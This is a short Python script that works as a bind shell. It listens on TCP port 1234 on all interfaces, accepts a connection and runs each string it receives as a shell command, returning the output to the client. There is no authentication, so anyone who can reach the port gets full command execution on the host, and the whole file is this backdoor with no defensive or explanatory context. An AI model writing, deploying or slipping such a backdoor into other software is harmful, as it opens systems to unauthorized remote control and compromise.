#!/usr/bin/env python


import socket
from subprocess import Popen,PIPE

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 1234              # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)              #once in a time
conn, addr = s.accept()

while 1:
    cmd = conn.recv(1024)
    p = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
    stdout = p.stdout.read()
    stderr = p.stderr.read()
    if stdout:
        conn.sendall(stdout)
    elif stderr:
        conn.sendall(stderr)
    if not cmd: break
conn.close()
